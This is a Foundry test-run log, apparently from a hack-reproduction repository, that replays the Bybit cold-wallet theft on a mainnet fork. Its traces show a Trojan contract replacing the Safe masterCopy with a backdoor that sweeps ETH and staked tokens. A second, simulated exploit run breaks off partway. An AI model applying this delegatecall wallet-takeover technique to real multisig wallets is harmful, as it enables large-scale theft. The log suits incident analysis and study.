@@ -1,0 +1,297 @@
+No files changed, compilation skipped
+
+Ran 2 tests for test/Bybit_exp.sol:Bybit
+[PASS] testExploit() (gas: 261763)
+Logs:
+  Real exploit start......
+  Before attack, Bybit cold wallet 1 masterCopy: 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F
+  After attack, Bybit cold wallet 1 masterCopy: 0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516
+  Attacker ETH Balance After exploit: 401346 ETH
+  Attacker mETH Balance After exploit: 8000 ETH
+  Attacker cmETH Balance After exploit: 15000 ETH
+  Attacker stETH Balance After exploit: 90375 ETH
+
+Traces:
+  [42777] Bybit::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 21895237 [2.189e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(Safe proxy factory: [0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B], "Safe proxy factory")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Safe master copy: [0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F], "Safe master copy")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Safe default fallback handler: [0xd5D82B6aDDc9027B22dCA772Aa68D5d74cdBdF44], "Safe default fallback handler")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Multisig owner 1: [0x6cd5327027190eF45476D80B5D3BdE2E80f6aCbC], "Multisig owner 1")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Multisig owner 2: [0xe6A99c3869D6D0691CCe23E83b571A471Bac661D], "Multisig owner 2")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Multisig owner 3: [0x72F42564BE83B755720dBadC875cc919046A1856], "Multisig owner 3")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4], "Bybit cold wallet 1")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Trojan contract: [0x96221423681A6d52E184D440a8eFCEbB105C7242], "Trojan contract")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Backdoor contract: [0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516], "Backdoor contract")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Mantle Staked Ether: [0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa], "Mantle Staked Ether")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Mantle Restaked Ether: [0xE6829d9a7eE3040e1276Fa75293Bde931859e8fA], "Mantle Restaked Ether")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Lido Staked ETH: [0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84], "Lido Staked ETH")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [271363] Bybit::testExploit()
+    ├─ [0] console::log("Real exploit start......") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::load(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4], 0x0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
+    │   └─ ← [Return] 0x00000000000000000000000034cfac646f301356faa8b21e94227e3583fe3f5f
+    ├─ [0] console::log("Before attack, Bybit cold wallet 1 masterCopy:", Safe master copy: [0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [41416] Bybit cold wallet 1::fallback(Trojan contract: [0x96221423681A6d52E184D440a8eFCEbB105C7242], 0, 0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000, 1, 45746 [4.574e4], 0, 0, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0xd0afef78a52fd504479dc2af3dc401334762cbd05609c7ac18db9ec5abf4a07a5cc09fc86efd3489707b89b0c729faed616459189cb50084f208d03b201b001f1f0f62ad358d6b319d3c1221d44456080068fe02ae5b1a39b4afb1e6721ca7f9903ac523a801533f265231cd35fc2dfddc3bd9a9563b51315cf9d5ff23dc6d2c221fdf9e4b878877a8dbeee951a4a31ddbf1d3b71e127d5eda44b4730030114baba52e06dd23da37cd2a07a6e84f9950db867374a0f77558f42adf4409bfd569673c1f)
+    │   ├─ [38458] Safe master copy::execTransaction(Trojan contract: [0x96221423681A6d52E184D440a8eFCEbB105C7242], 0, 0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000, 1, 45746 [4.574e4], 0, 0, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0xd0afef78a52fd504479dc2af3dc401334762cbd05609c7ac18db9ec5abf4a07a5cc09fc86efd3489707b89b0c729faed616459189cb50084f208d03b201b001f1f0f62ad358d6b319d3c1221d44456080068fe02ae5b1a39b4afb1e6721ca7f9903ac523a801533f265231cd35fc2dfddc3bd9a9563b51315cf9d5ff23dc6d2c221fdf9e4b878877a8dbeee951a4a31ddbf1d3b71e127d5eda44b4730030114baba52e06dd23da37cd2a07a6e84f9950db867374a0f77558f42adf4409bfd569673c1f) [delegatecall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x28eddb7e7d1dca66673b339ca554c63603dede0512d6da0300cf782f68a8a260, 27, 94391923511622314150678794118560158171488990316769324575454946676436775510138, 41953119487444945321687137536480671711551097178058656002053069051710091755551) [staticcall]
+    │   │   │   └─ ← [Return] 0x1F4EB0a903619ac168b19A82F1a6e2e426522211
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x28eddb7e7d1dca66673b339ca554c63603dede0512d6da0300cf782f68a8a260, 27, 6959039186985575715535140054017092108314614289103579568334304498771842038160, 26582460180123527978495787288059938386656268461173516087308230912084512943138) [staticcall]
+    │   │   │   └─ ← [Return] 0x3Cc3A225769900e003E264dd4CB43E90896BC21A
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x28eddb7e7d1dca66673b339ca554c63603dede0512d6da0300cf782f68a8a260, 27, 101145448355243895462584767977232777181583424891736705187278014741421010693029, 20818518369740733193553432370269611892486788192878631469575113730486931384124) [staticcall]
+    │   │   │   └─ ← [Return] 0xe3dF2cCEAc61B1aFA311372ecC5B40A3A6585a9E
+    │   │   ├─ [3159] Trojan contract::transfer(Backdoor contract: [0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516], 0) [delegatecall]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0: 0x00000000000000000000000034cfac646f301356faa8b21e94227e3583fe3f5f → 0x000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be2969516
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  emit topic 0: 0x442e715f626346e8c54381002da614f62bee8d27386535b2521ec8540898556e
+    │   │   │           data: 0xb3476d061aeb8fc1d605a873c483a2402d88a68a9cdd1a8b47655dd55ba004f80000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 5: 71 → 72
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    ├─ [0] VM::load(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4], 0x0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
+    │   └─ ← [Return] 0x000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be2969516
+    ├─ [0] console::log("After attack, Bybit cold wallet 1 masterCopy:", Backdoor contract: [0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::startPrank(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e])
+    │   └─ ← [Return]
+    ├─ [10049] Bybit cold wallet 1::fallback(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e])
+    │   ├─ [7218] Backdoor contract::sweepETH(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [delegatecall]
+    │   │   ├─ [0] Attacker::fallback{value: 401346768858404671846374}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [0] console::log("Attacker ETH Balance After exploit:", 401346 [4.013e5], "ETH") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [25367] Bybit cold wallet 1::fallback(Mantle Staked Ether: [0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa], Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e])
+    │   ├─ [25033] Backdoor contract::sweepERC20(Mantle Staked Ether: [0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa], Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [delegatecall]
+    │   │   ├─ [9656] Mantle Staked Ether::balanceOf(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4]) [staticcall]
+    │   │   │   ├─ [2553] 0xc9173Bf8Bd5c1b071B5CaE4122202A347b7EeFab::balanceOf(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 8000000000000000000000 [8e21]
+    │   │   │   └─ ← [Return] 8000000000000000000000 [8e21]
+    │   │   ├─ [11251] Mantle Staked Ether::transfer(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], 8000000000000000000000 [8e21])
+    │   │   │   ├─ [10645] 0xc9173Bf8Bd5c1b071B5CaE4122202A347b7EeFab::transfer(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], 8000000000000000000000 [8e21]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4], to: Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], value: 8000000000000000000000 [8e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2bc961b973384a3404cce10ae1077f29140d2ce32fcab25ba27386ce4722cb9b: 0x00000000000000000000000000000000000000000000000000429c9f76e4c60c → 0x0000000000000000000000000000000000000000000001b1ae900ace6be4c60c
+    │   │   │   │   │   @ 0xd19d5cc5f1b0233c320be6eae4fdd52b6c04a91fd23459ba5485fc138139a3fd: 0x0000000000000000000000000000000000000000000001b1ae4d6e2ef5000000 → 0
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [1156] Mantle Staked Ether::balanceOf(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [staticcall]
+    │   ├─ [553] 0xc9173Bf8Bd5c1b071B5CaE4122202A347b7EeFab::balanceOf(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [delegatecall]
+    │   │   └─ ← [Return] 8000018749557171340812 [8e21]
+    │   └─ ← [Return] 8000018749557171340812 [8e21]
+    ├─ [0] console::log("Attacker mETH Balance After exploit:", 8000, "ETH") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [65374] Bybit cold wallet 1::fallback(Mantle Restaked Ether: [0xE6829d9a7eE3040e1276Fa75293Bde931859e8fA], Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e])
+    │   ├─ [65040] Backdoor contract::sweepERC20(Mantle Restaked Ether: [0xE6829d9a7eE3040e1276Fa75293Bde931859e8fA], Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [delegatecall]
+    │   │   ├─ [9803] Mantle Restaked Ether::fallback(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4]) [staticcall]
+    │   │   │   ├─ [2559] 0x9d7aeF0cbcD7B5BAe2ccc4cF69F68443468bf9F6::balanceOf(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 15000000000000000000000 [1.5e22]
+    │   │   │   └─ ← [Return] 15000000000000000000000 [1.5e22]
+    │   │   ├─ [51111] Mantle Restaked Ether::fallback(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], 15000000000000000000000 [1.5e22])
+    │   │   │   ├─ [50364] 0x9d7aeF0cbcD7B5BAe2ccc4cF69F68443468bf9F6::transfer(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], 15000000000000000000000 [1.5e22]) [delegatecall]
+    │   │   │   │   ├─ [9630] 0x4733E66EbDEe88711eb502580b4d03685D3d30F5::isTransferPaused() [staticcall]
+    │   │   │   │   │   ├─ [2389] 0xa91377ab040D9571e14Ac8192343a3247C84DE7e::isTransferPaused() [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ emit Transfer(from: Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4], to: Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], value: 15000000000000000000000 [1.5e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x4790cb24ca63835461a358dc669c67f9a7ccad079b00a0380c748967cfd8749c: 0 → 0x00000000000000000000000000000000000000000000032d26d12e980b600000
+    │   │   │   │   │   @ 0x7c5d32b7a9e1fedbba36bb2678ba336c5c1d24802b01c0164e2a8b2d59b2ef38: 0x00000000000000000000000000000000000000000000032d26d12e980b600000 → 0
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [1303] Mantle Restaked Ether::fallback(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [staticcall]
+    │   ├─ [559] 0x9d7aeF0cbcD7B5BAe2ccc4cF69F68443468bf9F6::balanceOf(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [delegatecall]
+    │   │   └─ ← [Return] 15000000000000000000000 [1.5e22]
+    │   └─ ← [Return] 15000000000000000000000 [1.5e22]
+    ├─ [0] console::log("Attacker cmETH Balance After exploit:", 15000 [1.5e4], "ETH") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [60511] Bybit cold wallet 1::fallback(Lido Staked ETH: [0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84], Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e])
+    │   ├─ [60177] Backdoor contract::sweepERC20(Lido Staked ETH: [0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84], Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [delegatecall]
+    │   │   ├─ [33968] Lido Staked ETH::fallback(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4]) [staticcall]
+    │   │   │   ├─ [8263] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   │   │   ├─ [2820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb
+    │   │   │   │   └─ ← [Return] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb
+    │   │   │   ├─ [15088] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 90375547907685258392043 [9.037e22]
+    │   │   │   └─ ← [Return] 90375547907685258392043 [9.037e22]
+    │   │   ├─ [22083] Lido Staked ETH::fallback(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], 90375547907685258392043 [9.037e22])
+    │   │   │   ├─ [1763] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   │   │   ├─ [820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb
+    │   │   │   │   └─ ← [Return] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb
+    │   │   │   ├─ [18697] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::transfer(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], 90375547907685258392043 [9.037e22]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4], to: Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], value: 90375547907685258392043 [9.037e22])
+    │   │   │   │   ├─ emit TransferShares(_from: Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4], _to: Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], _shares: 75654955780252436545158 [7.565e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1011f8e9cac50da2ed391e6f5b8b22b154028498900dc6cc074b91b1abbc8730: 1 → 0x000000000000000000000000000000000000000000001005436c450138283e87
+    │   │   │   │   │   @ 0x6c18f90d546f63b8ad51d19dc8cd22f02198c9a64d8e3a14f262b13a03780ce7: 0x000000000000000000000000000000000000000000001005436c450138283e87 → 1
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [6468] Lido Staked ETH::fallback(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [staticcall]
+    │   ├─ [1763] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   ├─ [820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   └─ ← [Return] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb
+    │   │   └─ ← [Return] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb
+    │   ├─ [3088] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e]) [delegatecall]
+    │   │   └─ ← [Return] 90375547907685258392043 [9.037e22]
+    │   └─ ← [Return] 90375547907685258392043 [9.037e22]
+    ├─ [0] console::log("Attacker stETH Balance After exploit:", 90375 [9.037e4], "ETH") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+[PASS] testFakeExploit() (gas: 884005)
+Logs:
+  Fake exploit start......
+  Before attack, multisigWallet masterCopy: 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F
+  After attack, multisigWallet masterCopy: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
+  After attack, multisigWallet balance left: 0 ETH
+  Attacker earned balance: 400000 ETH
+
+Traces:
+  [42777] Bybit::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 21895237 [2.189e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(Safe proxy factory: [0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B], "Safe proxy factory")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Safe master copy: [0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F], "Safe master copy")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Safe default fallback handler: [0xd5D82B6aDDc9027B22dCA772Aa68D5d74cdBdF44], "Safe default fallback handler")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Multisig owner 1: [0x6cd5327027190eF45476D80B5D3BdE2E80f6aCbC], "Multisig owner 1")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Multisig owner 2: [0xe6A99c3869D6D0691CCe23E83b571A471Bac661D], "Multisig owner 2")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Multisig owner 3: [0x72F42564BE83B755720dBadC875cc919046A1856], "Multisig owner 3")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Bybit cold wallet 1: [0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4], "Bybit cold wallet 1")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Trojan contract: [0x96221423681A6d52E184D440a8eFCEbB105C7242], "Trojan contract")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Backdoor contract: [0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516], "Backdoor contract")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Attacker: [0x0fa09C3A328792253f8dee7116848723b72a6d2e], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Mantle Staked Ether: [0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa], "Mantle Staked Ether")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Mantle Restaked Ether: [0xE6829d9a7eE3040e1276Fa75293Bde931859e8fA], "Mantle Restaked Ether")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Lido Staked ETH: [0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84], "Lido Staked ETH")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [884005] Bybit::testFakeExploit()
+    ├─ [0] console::log("Fake exploit start......") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [103751] → new Trojan@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 518 bytes of code
+    ├─ [250892] → new Backdoor@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 1253 bytes of code
+    ├─ [298927] Safe proxy factory::createProxyWithNonce(Safe master copy: [0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F], 0xb63e800d0000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000180000000000000000000000000d5d82b6addc9027b22dca772aa68d5d74cdbdf4400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030000000000000000000000006cd5327027190ef45476d80b5d3bde2e80f6acbc000000000000000000000000e6a99c3869d6d0691cce23e83b571a471bac661d00000000000000000000000072f42564be83b755720dbadc875cc919046a18560000000000000000000000000000000000000000000000000000000000000000, 1740147203 [1.74e9])
+    │   ├─ [56409] → new <unknown>@0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x00000000000000000000000034cfac646f301356faa8b21e94227e3583fe3f5f
+    │   │   └─ ← [Return] 170 bytes of code
+    │   ├─ [206084] 0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615::setup([0x6cd5327027190eF45476D80B5D3BdE2E80f6aCbC, 0xe6A99c3869D6D0691CCe23E83b571A471Bac661D, 0x72F42564BE83B755720dBadC875cc919046A1856], 2, 0x0000000000000000000000000000000000000000, 0x, Safe default fallback handler: [0xd5D82B6aDDc9027B22dCA772Aa68D5d74cdBdF44], 0x0000000000000000000000000000000000000000, 0, 0x0000000000000000000000000000000000000000)
+    │   │   ├─ [203184] Safe master copy::setup([0x6cd5327027190eF45476D80B5D3BdE2E80f6aCbC, 0xe6A99c3869D6D0691CCe23E83b571A471Bac661D, 0x72F42564BE83B755720dBadC875cc919046A1856], 2, 0x0000000000000000000000000000000000000000, 0x, Safe default fallback handler: [0xd5D82B6aDDc9027B22dCA772Aa68D5d74cdBdF44], 0x0000000000000000000000000000000000000000, 0, 0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0: 0 → 0x0000000000000000000000006cd5327027190ef45476d80b5d3bde2e80f6acbc
+    │   │   │   │   @ 0x462c4c1e810f0b54b211169578541ec34151561a0a4c061837fe808bef1c9f3c: 0 → 1
+    │   │   │   │   @ 0xada447330c58946d186e15f1e3bf3262aa250124709aa507da9362f5df351af3: 0 → 0x00000000000000000000000072f42564be83b755720dbadc875cc919046a1856
+    │   │   │   │   @ 6: 0 → 0xc87e8d93340de68900f854ea16d80854d67717ac8831fd3e331d38896a56dc86
+    │   │   │   │   @ 0x3d5b4c782be30aa59d3d0f54870d636853da73ebc35749d5bd1ce34cc29bddbb: 0 → 0x000000000000000000000000e6a99c3869d6d0691cce23e83b571a471bac661d
+    │   │   │   │   @ 4: 0 → 2
+    │   │   │   │   @ 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5: 0 → 0x000000000000000000000000d5d82b6addc9027b22dca772aa68d5d74cdbdf44
+    │   │   │   │   @ 0xcc69885fda6bcc1a4ace058b4a62bf5e179ea78fd58a1ccd71c22cc9b688792f: 0 → 1
+    │   │   │   │   @ 3: 0 → 3
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─ emit ProxyCreation(: 0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615)
+    │   └─ ← [Return] 0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615
+    ├─ [2682] 0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615::nonce() [staticcall]
+    │   ├─ [2351] Safe master copy::nonce() [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [2457] 0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615::getTransactionHash(Trojan: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 0xa9059cbb0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000000000000000000000000000000000000000000000, 1, 45746 [4.574e4], 0, 0, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0) [staticcall]
+    │   ├─ [2048] Safe master copy::getTransactionHash(Trojan: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 0xa9059cbb0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000000000000000000000000000000000000000000000, 1, 45746 [4.574e4], 0, 0, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0) [delegatecall]
+    │   │   └─ ← [Return] 0x56caa7755b65800df665310d890787a5ccf4f69bb4dec9717b6c3e5cf0036759
+    │   └─ ← [Return] 0x56caa7755b65800df665310d890787a5ccf4f69bb4dec9717b6c3e5cf0036759
+    ├─ [0] VM::sign("<pk>", 0x56caa7755b65800df665310d890787a5ccf4f69bb4dec9717b6c3e5cf0036759) [staticcall]
+    │   └─ ← [Return] 27, 0x2b89bd9c58d5276b6964d16c33c6eb054eac80d5625e5e19199f25532a6b0e47, 0x4f5bdb5260985c12f07b28867fe6ccbac236de4cfd88f21b8180f6a9e3bf0be4
+    ├─ [0] VM::sign("<pk>", 0x56caa7755b65800df665310d890787a5ccf4f69bb4dec9717b6c3e5cf0036759) [staticcall]
+    │   └─ ← [Return] 27, 0x090e00f26a9bd4cd263a7335344b7234007a09aff18e28572e072da67bb70172, 0x08c683ee5b5073bcd4a0c266191b0dc242c0ab2e952a8107efb79fbb319cb3f0
+    ├─ [0] VM::load(0x3e4d9f3Eb3cff27902b4a07d5ec90ACfe5657615, 0x0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
+    │   └─ ← [Return] 0x00000000000000000000000034cfac646f301356faa8b21e94227e3583fe3f5f
+    ├─ [0] console::log("Before attack, multisigWallet masterCopy:", Safe master copy: [0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F]) [staticcall]
+    │   └─ ← [Stop]
